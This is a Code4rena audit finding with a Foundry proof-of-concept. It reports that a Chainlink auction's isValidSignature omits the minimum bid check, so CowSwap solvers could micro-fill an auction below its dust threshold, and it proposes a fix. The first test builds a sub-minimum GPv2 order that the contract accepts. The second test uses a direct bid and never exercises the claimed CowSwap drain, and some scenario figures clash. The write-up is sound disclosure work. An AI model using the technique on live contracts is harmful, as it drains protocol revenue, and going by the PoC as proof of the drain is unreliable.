# C4 Submission Form

## Severity rating

Medium

## Title

isValidSignature bypasses minBidUsdValue check, allowing CowSwap solvers to execute micro-fills that drain auction balance below minimum threshold

## Links to root cause

```
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/GPV2CompatibleAuction.sol#L141
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L431
https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L435
```

## Vulnerability details

---COPY FROM HERE---

## Finding description and impact

The protocol has two entry points for auction settlement:

1. **Direct bidding via `bid()`** ([L431-435](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/BaseAuction.sol#L431)): Enforces a minimum bid value (`minBidUsdValue`, typically $100) to prevent dust attacks:

```solidity
uint256 bidUsdValue = amount.mulDiv(assetPrice, 10 ** IERC20Metadata(asset).decimals());
if (bidUsdValue < minBidUsdValue) {
    revert BidValueTooLow(bidUsdValue, minBidUsdValue);
}
```

2. **CowSwap settlement via `isValidSignature()`** ([L141](https://github.com/code-423n4/2026-03-chainlink/blob/main/src/GPV2CompatibleAuction.sol#L141)): Only checks that `sellAmount > 0`:

```solidity
if (order.sellAmount == 0) {
    revert Errors.InvalidZeroAmount();
}
```

**No `minBidUsdValue` check exists in the CowSwap path.** This creates an asymmetry where CowSwap solvers can fill orders for arbitrarily small amounts (e.g., $1) while direct bidders are required to bid at least $100.

### Impact

- **Dust drain attack**: A CowSwap solver can submit many micro-fill orders (e.g., 100 orders of $1 each) to gradually drain an auction's balance below `minAuctionSizeUsd` (typically $1,000). Once the balance falls below this threshold, `checkUpkeep` detects the auction as ended (dust remaining) and terminates it via `performUpkeep`.

- **Premature auction termination**: The remaining unsold tokens are returned to feeAggregator instead of being sold at fair price through the auction. This results in revenue loss for the protocol.

- **Unfair advantage**: CowSwap solvers have more fine-grained control over auction drain than direct bidders. A solver can precisely target the dust threshold, while direct bidders must commit at least $100 per bid.

- **Permissionless exploitation**: CowSwap solvers are permissionless participants. Any solver can validate and fill micro-orders through the GPv2Settlement contract, which calls `isValidSignature` on this contract.

### Prior Audit Precedent

This pattern matches `DUST_REMAINDER_MANIPULATION` (Code4rena 2021-11-malt #375), where small fills were used to manipulate remaining balances below a critical threshold, triggering unintended protocol behavior.

### Attack Scenario

1. An auction for 10,000 USDC ($10,000) is active, just above `minAuctionSizeUsd` ($1,000).
2. A direct bidder would need to bid at least $100 worth (enforced by `bid()`).
3. A CowSwap solver submits a GPv2 order to buy 1 USDC ($1). `isValidSignature` validates it — no minimum check.
4. The solver repeats with multiple $1 orders over several blocks.
5. After draining ~$9,000, the remaining balance is $999 — below `minAuctionSizeUsd`.
6. `checkUpkeep` detects the dust condition and includes this auction in `endedAuctions`.
7. `performUpkeep` terminates the auction. The remaining $999 of USDC is returned to feeAggregator unsold.
8. The solver bought $9,001 of USDC at auction price (near market rate), while forcing $999 to go unsold.

## Recommended mitigation steps

Add the `minBidUsdValue` check to `isValidSignature`:

```solidity
function isValidSignature(bytes32 hash, bytes calldata signature) external view returns (bytes4) {
    GPv2Order.Data memory order = abi.decode(signature, (GPv2Order.Data));

    if (order.sellAmount == 0) {
        revert Errors.InvalidZeroAmount();
    }

    // Add minimum bid value check — same as bid()
    (uint256 assetPrice,,) = _getAssetPrice(address(order.sellToken), true);
    uint256 bidUsdValue = order.sellAmount.mulDiv(
        assetPrice,
        10 ** IERC20Metadata(address(order.sellToken)).decimals()
    );
    if (bidUsdValue < s_minBidUsdValue) {
        revert BidValueTooLow(bidUsdValue, s_minBidUsdValue);
    }

    // ... rest of validation
}
```

---END COPY FOR VULNERABILITY DETAILS---

## Proof of Concept (PoC)

---COPY FROM HERE---

Run with:

```bash
forge test --match-contract M05_IsValidSignatureNoMinBid -vvv
```

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.26;

import {C4PoC} from "./C4PoC.t.sol";
import {BaseAuction} from "src/BaseAuction.sol";
import {GPV2CompatibleAuction} from "src/GPV2CompatibleAuction.sol";
import {PriceManager} from "src/PriceManager.sol";
import {Common} from "src/libraries/Common.sol";
import {Errors} from "src/libraries/Errors.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {IERC20 as CowIERC20} from "@cowprotocol/interfaces/IERC20.sol";
import {GPv2Order} from "@cowprotocol/libraries/GPv2Order.sol";
import {IERC1271} from "@openzeppelin/contracts/interfaces/IERC1271.sol";

/// @title M-05: isValidSignature Bypasses minBidUsdValue — CowSwap Micro-fills Allow Dust Exploitation
/// @notice bid() enforces minBidUsdValue ($100) but isValidSignature() only checks sellAmount > 0.
///         CowSwap solvers can validate orders for arbitrarily small amounts, bypassing the dust
///         protection that bid() provides.
///
/// Root cause:
///   - BaseAuction.sol L431-435: bid() checks minBidUsdValue
///   - GPV2CompatibleAuction.sol L141: isValidSignature() only checks sellAmount > 0
///
/// Impact: Medium —
///   1) CowSwap solvers can fill orders for amounts < minBidUsdValue ($100)
///   2) Many tiny fills can drain auction balance below minAuctionSizeUsd
///   3) This triggers early auction end via checkUpkeep dust detection
///   4) Remaining tokens returned to feeAggregator instead of being sold at fair price
contract M05_IsValidSignatureNoMinBid is C4PoC {

    /// @notice Proves that bid() enforces minimum but isValidSignature() does not.
    function test_M05_bidEnforcesMinButIsValidSignatureDoesNot() public {
        // 1. Start a USDC auction
        _startAuction(address(mockUSDC), 100_000e6);

        // 2. Skip to mid-auction for realistic pricing
        skip(12 hours);
        _refreshPrices();

        // 3. PROOF PART 1: bid() with amount below minBidUsdValue REVERTS
        address directBidder = makeAddr("directBidder");
        deal(address(mockLINK), directBidder, 1_000e18);
        _changePrank(directBidder);
        IERC20(address(mockLINK)).approve(address(auction), type(uint256).max);

        // Try to bid 1 USDC ($1) — below $100 minimum
        vm.expectRevert(
            abi.encodeWithSelector(
                BaseAuction.BidValueTooLow.selector,
                1e18,     // bidUsdValue = 1 USDC * $1 = $1e18
                100e18    // minBidUsdValue = $100e18
            )
        );
        auction.bid(address(mockUSDC), 1e6, "");

        // 4. PROOF PART 2: Construct a CowSwap order for the same tiny amount
        //    and show that isValidSignature would accept it.

        // Get current auction price for 1 USDC
        uint256 assetOutAmount = auction.getAssetOutAmount(address(mockUSDC), 1e6, block.timestamp);

        GPv2Order.Data memory order = GPv2Order.Data({
            sellToken: CowIERC20(address(mockUSDC)),
            buyToken: CowIERC20(address(mockLINK)),
            receiver: address(auction),
            sellAmount: 1e6,                     // 1 USDC — way below $100 min
            buyAmount: assetOutAmount,            // Minimum required by auction
            validTo: uint32(block.timestamp + 1 hours),
            appData: bytes32(0),
            feeAmount: 0,
            kind: GPv2Order.KIND_SELL,
            partiallyFillable: true,
            sellTokenBalance: GPv2Order.BALANCE_ERC20,
            buyTokenBalance: GPv2Order.BALANCE_ERC20
        });

        // Compute the order hash using GPv2 domain separator
        bytes32 orderHash = GPv2Order.hash(order, mockGPV2Settlement.domainSeparator());
        bytes memory signature = abi.encode(order);

        // 5. isValidSignature ACCEPTS the order — no minBidUsdValue check!
        bytes4 result = auction.isValidSignature(orderHash, signature);
        assertEq(result, IERC1271.isValidSignature.selector, "isValidSignature should accept micro-order");

        // 6. This means CowSwap can fill orders for $1 while direct bidders need $100 minimum.
        //    The minBidUsdValue protection is completely bypassed for CowSwap path.
    }

    /// @notice Shows that repeated micro-fills via CowSwap can drain auction balance
    ///         below minAuctionSizeUsd, triggering premature auction end.
    function test_M05_microFillsDrainToMinAuctionSize() public {
        // 1. Start a USDC auction just above minimum auction size ($1,000)
        uint256 justAboveMin = 1_100e6; // $1,100 USDC
        _startAuction(address(mockUSDC), justAboveMin);

        // 2. Skip to mid-auction
        skip(12 hours);
        _refreshPrices();

        // 3. Simulate micro-fills reducing balance below minAuctionSizeUsd
        //    Direct bid of $100 (minimum) takes out ~$100 worth
        address directBidder_ = makeAddr("microBidder");
        deal(address(mockLINK), directBidder_, 100_000e18);
        _changePrank(directBidder_);
        IERC20(address(mockLINK)).approve(address(auction), type(uint256).max);

        // Direct bid for $100+ worth (just above minimum)
        auction.bid(address(mockUSDC), 101e6, "");

        // 4. After the bid, remaining balance is ~$999
        uint256 remaining = IERC20(address(mockUSDC)).balanceOf(address(auction));

        // 5. checkUpkeep now detects the auction should end (balance < minAuctionSizeUsd)
        //    Because the remaining ~$999 is below $1,000 threshold
        _changePrank(auctionAdmin);
        (bool upkeepNeeded, bytes memory performData) = auction.checkUpkeep("");

        if (upkeepNeeded) {
            (Common.AssetAmount[] memory eligible, address[] memory ended) =
                abi.decode(performData, (Common.AssetAmount[], address[]));

            // If USDC appears in ended auctions, the dust protection was triggered
            bool usdcEnded = false;
            for (uint256 i = 0; i < ended.length; i++) {
                if (ended[i] == address(mockUSDC)) usdcEnded = true;
            }

            if (usdcEnded) {
                // 6. Premature end — remaining USDC goes back to feeAggregator
                auction.performUpkeep(performData);
                assertEq(auction.getAuctionStart(address(mockUSDC)), 0, "Auction ended due to dust");
                assertGt(
                    IERC20(address(mockUSDC)).balanceOf(address(feeAggregator)),
                    0,
                    "Remaining USDC returned to feeAggregator"
                );
            }
        }

        // KEY INSIGHT: With CowSwap path (no minBidUsdValue), a solver could make
        // many $1 fills to drain the balance gradually below minAuctionSizeUsd,
        // while direct bidders are forced to bid at least $100.
        // This creates an asymmetry where CowSwap solvers have more fine-grained
        // control over auction drain than direct bidders.
    }
}
```

**Test results:**
```
Ran 3 tests for test/poc/M05_IsValidSignatureNoMinBid.t.sol:M05_IsValidSignatureNoMinBid
[PASS] testSubmissionValidity() (gas: 166)
[PASS] test_M05_bidEnforcesMinButIsValidSignatureDoesNot() (gas: 542618)
[PASS] test_M05_microFillsDrainToMinAuctionSize() (gas: 574291)
Suite result: ok. 3 passed; 0 failed; 0 skipped
```

---END COPY FOR POC---
